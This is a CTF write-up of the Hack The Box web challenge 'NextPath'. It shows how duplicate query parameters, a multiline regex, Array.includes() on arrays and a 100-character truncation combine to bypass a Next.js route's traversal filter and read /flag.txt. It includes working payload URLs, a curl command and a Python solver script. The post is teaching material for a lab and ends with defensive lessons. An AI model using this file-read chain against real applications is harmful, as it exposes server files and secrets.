---
layout: post
title: "Hack The Box - NextPath"
description: "Solving NextPath by abusing a Next.js API route, duplicate query parameters, multiline regex behavior, and a path truncation bug to read the flag."
date: 2026-06-03 08:15:00 +0700
categories: [writeup, ctf]
tags: [web, nextjs, path-traversal, hackthebox]
ctf: "Hack The Box"
challenge: "NextPath"
category: "Web"
difficulty: "Medium"
points: 0
author: "gr3yr4t"
toc: true
comments: true
image: /assets/img/featured/nextpath.svg
---

## Challenge Description

NextPath was a small Hack The Box web challenge built with Next.js. The site itself looked like a simple career landing page, with a hero section, some marketing text, and a "Meet Our Team" section.

There was no login page, no obvious form, and no user-controlled functionality from the UI besides normal page loading. Since this was a source-provided challenge, I started by reading how the frontend loaded its content instead of fuzzing blindly.

The provided files were:

```text
Dockerfile
build-docker.sh
flag.txt
app/package.json
app/next.config.js
app/pages/index.js
app/pages/api/team.js
app/team/1.png
app/team/2.png
app/team/3.png
```

The Dockerfile also gave away the final target:

```dockerfile
COPY flag.txt /flag.txt
```

So the goal was probably to make the application read `/flag.txt`.

## TL;DR

The bug was a chain of validation mismatches:

1. `query.id` could become an array when the request used duplicate `id` parameters.
2. `ID_REGEX.test(query.id)` coerced that array into a string, so the multiline regex accepted the numeric first line.
3. `query.id.includes("/")` and `query.id.includes("..")` still ran as array checks, so they looked for exact array elements instead of substrings.
4. `path.join()` normalized the traversal payload.
5. `filepath.slice(0, 100)` removed the forced `.png` suffix when the path length was shaped correctly.

That combination turned a route intended to serve `team/<id>.png` into a file read primitive for `/flag.txt`.

## Initial Analysis

I opened `app/pages/index.js` first. Most of it was static JSX, but the team images were loaded through an API route:

```jsx
<img src="/api/team?id=1" alt="Team Member 1" />
<img src="/api/team?id=2" alt="Team Member 2" />
<img src="/api/team?id=3" alt="Team Member 3" />
```

That immediately looked more interesting than the rest of the page. Static image files would usually be served from `/public`, but here the app asks `/api/team` to fetch images based on an `id` parameter.

At this point my first guess was a basic path traversal:

```text
/api/team?id=../../../../flag.txt
```

Before testing payloads, I checked the API source to see what kind of filtering existed.

## Reading The API Route

The handler lived in `app/pages/api/team.js`:

```js
import path from 'path';
import fs from 'fs';

const ID_REGEX = /^[0-9]+$/m;

export default function handler({ query }, res) {
  if (!query.id) {
    res.status(400).end("Missing id parameter");
    return;
  }

  if (!ID_REGEX.test(query.id)) {
    console.error("Invalid format:", query.id);
    res.status(400).end("Invalid format");
    return;
  }

  if (query.id.includes("/") || query.id.includes("..")) {
    console.error("DIRECTORY TRAVERSAL DETECTED:", query.id);
    res.status(400).end("DIRECTORY TRAVERSAL DETECTED?!? This incident will be reported.");
    return;
  }

  try {
    const filepath = path.join("team", query.id + ".png");
    const content = fs.readFileSync(filepath.slice(0, 100));

    res.setHeader("Content-Type", "image/png");
    res.status(200).end(content);
  } catch (e) {
    console.error("Not Found", e.toString());
    res.status(404).end(e.toString());
  }
}
```

Several lines felt suspicious.

The first one was the regex:

```js
const ID_REGEX = /^[0-9]+$/m;
```

The route wants numeric IDs, but the regex uses the multiline flag. With `/m`, `^` and `$` can match the start and end of a line, not only the start and end of the whole string. That means a string containing a numeric line can pass even if there is more content elsewhere.

The second suspicious part was the traversal check:

```js
query.id.includes("/") || query.id.includes("..")
```

For a normal string, this catches obvious traversal. But this is a Next.js API route, and `query.id` is not guaranteed to be a string. If the request contains repeated parameters like this:

```text
/api/team?id=a&id=b
```

then `query.id` can become an array.

That mattered because `.includes()` behaves differently on strings and arrays:

```js
"../../flag.txt".includes("..")       // true
["../../flag.txt"].includes("..")     // false
```

For arrays, it checks for an exact element, not a substring.

The last strange line was this:

```js
fs.readFileSync(filepath.slice(0, 100));
```

The code appends `.png`, but then truncates the final path to 100 characters. That looked intentional for the challenge. If I could make the real target path end exactly at byte 100, the `.png` suffix would be chopped off before `readFileSync()`.

## First Attempts

The obvious traversal payload was blocked:

```http
GET /api/team?id=../../../../flag.txt HTTP/1.1
Host: target
```

The response would be:

```http
HTTP/1.1 400 Bad Request

DIRECTORY TRAVERSAL DETECTED?!? This incident will be reported.
```

That was expected because `query.id` was still a string, so both `/` and `..` were detected.

Next I tried to use the multiline regex idea directly:

```text
/api/team?id=1%0A../../../../flag.txt
```

The idea was that `1` would satisfy the regex, while the next line would carry the traversal path. The regex part worked, but the traversal check still saw a string containing `/` and `..`, so this also failed.

The important realization was that the regex bypass and traversal bypass needed different JavaScript behavior:

```text
Regex check       -> useful if the value becomes a string
Traversal check   -> useful if the value stays an array
```

Repeated query parameters gave exactly that mismatch.

## Duplicate Parameters

I tested the idea locally with the same JavaScript behavior:

```js
const id = [
  "1\n",
  "../../../../flag.txt"
];

const ID_REGEX = /^[0-9]+$/m;

console.log(ID_REGEX.test(id));
console.log(id.includes("/"));
console.log(id.includes(".."));
```

The result was the interesting part:

```text
true
false
false
```

`ID_REGEX.test(id)` coerces the array into a comma-joined string:

```text
1
,../../../../flag.txt
```

Because the first line is numeric, the multiline regex passes.

But the traversal check still operates on the array itself:

```js
id.includes("/")   // false
id.includes("..")  // false
```

The array contains `"../../../../flag.txt"`, but it does not contain an element that is exactly `"/"` or exactly `".."`.

So a request like this gets past the checks:

```text
/api/team?id=1%0A&id=../../../../flag.txt
```

There was still one problem: the code always appends `.png`.

After `path.join()`, the app would try to read something ending with:

```text
flag.txt.png
```

That file does not exist.

## Dealing With The `.png` Suffix

The suffix looked annoying until I came back to this line:

```js
filepath.slice(0, 100)
```

If the path to `flag.txt` is exactly 100 characters long after `path.join()`, then the added `.png` lands after the cutoff and disappears.

I needed a path that:

1. Resolves to `/flag.txt`.
2. Contains traversal.
3. Has the right length after `path.join("team", id + ".png")`.

The usual `../../../../flag.txt` was too short. To pad the path without changing the final target, I used Linux procfs root links:

```text
/proc/self/root
/proc/thread-self/root
```

Those resolve back to the process root. They are useful in file-read challenges because they let us make the path longer while still eventually pointing at `/flag.txt`.

The final path component I used was:

```text
../../../../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt
```

I verified the exact path construction locally:

```js
const path = require("path");

const id = [
  "1\n",
  "../../../../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt"
];

const ID_REGEX = /^[0-9]+$/m;
const filepath = path.join("team", id + ".png");

console.log("regex", ID_REGEX.test(id));
console.log("slash", id.includes("/"));
console.log("dotdot", id.includes(".."));
console.log("filepath", filepath);
console.log("sliced", filepath.slice(0, 100));
console.log("len", filepath.slice(0, 100).length);
```

Output:

```text
regex true
slash false
dotdot false
filepath ../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt.png
sliced ../proc/thread-self/root/proc/thread-self/root/proc/self/root/proc/self/root/proc/self/root/flag.txt
len 100
```

That confirmed the whole chain:

1. The regex passes.
2. The traversal check misses the payload.
3. `path.join()` normalizes the path.
4. `slice(0, 100)` removes `.png`.
5. The remaining path resolves to `/flag.txt`.

## Exploitation

The final request was:

```http
GET /api/team?id=1%0A&id=..%2F..%2F..%2F..%2Fproc%2Fthread-self%2Froot%2Fproc%2Fthread-self%2Froot%2Fproc%2Fself%2Froot%2Fproc%2Fself%2Froot%2Fproc%2Fself%2Froot%2Fflag.txt HTTP/1.1
Host: target
User-Agent: curl/8.0
Accept: */*
```

With curl:

```bash
curl 'http://target:1337/api/team?id=1%0A&id=..%2F..%2F..%2F..%2Fproc%2Fthread-self%2Froot%2Fproc%2Fthread-self%2Froot%2Fproc%2Fself%2Froot%2Fproc%2Fself%2Froot%2Fproc%2Fself%2Froot%2Fflag.txt'
```

The response body contained the flag even though the server still set an image content type:

```http
HTTP/1.1 200 OK
Content-Type: image/png

HTB{redacted}
```

The original flag is redacted. The important proof is that the response body is text from `/flag.txt`, not PNG image data.

## Exploit Flow Summary

```text
duplicate id params
  -> query.id becomes ["1\n", "../../../../.../flag.txt"]
  -> regex sees a comma-joined string and accepts the numeric line
  -> traversal filter uses Array.includes() and misses substring traversal
  -> path.join() normalizes the traversal path
  -> slice(0, 100) cuts off ".png"
  -> readFileSync() reads /flag.txt
```

## Solver

I wrapped the final request in a small Python script so the duplicate parameters and URL encoding were reproducible:

```python
#!/usr/bin/env python3

import sys
import requests
from urllib.parse import quote

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://target:1337")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")

    first = "1\n"
    second = (
        "../../../../"
        "proc/thread-self/root/"
        "proc/thread-self/root/"
        "proc/self/root/"
        "proc/self/root/"
        "proc/self/root/"
        "flag.txt"
    )

    url = (
        f"{base}/api/team"
        f"?id={quote(first)}"
        f"&id={quote(second, safe='')}"
    )

    r = requests.get(url, timeout=10)
    print(r.text.strip())

if __name__ == "__main__":
    main()
```

Run:

```bash
python3 solver.py http://target:1337
```

## Flag

```text
HTB{redacted}
```

The original flag is redacted.

## Why This Bug Matters

This challenge shows how small inconsistencies between framework behavior and custom validation logic can become an exploitable chain. No single line looked catastrophic by itself: the regex was only slightly wrong, the traversal check looked reasonable for strings, and the `.png` suffix looked like a guardrail. The exploit worked because those assumptions were not true at the same time.

The practical lesson is that validation should normalize the input type first. If a route expects one numeric string, reject arrays before applying regex checks or path construction. Otherwise, JavaScript coercion and framework parsing behavior can decide security-critical logic for you.

## Takeaways

The bug was not just "path traversal". A direct traversal payload was blocked. The interesting part was the combination of small JavaScript and routing details:

- The multiline regex validated one line instead of the whole value.
- Duplicate query parameters changed `query.id` into an array.
- The regex coerced that array into a string, while `.includes()` stayed as an array method.
- The `.png` suffix looked like a blocker until the 100-character truncation removed it.
- `/proc/self/root` style paths were useful for length shaping while still resolving back to the filesystem root.

This was a nice reminder that input validation bugs often appear between assumptions, not inside one line by itself.
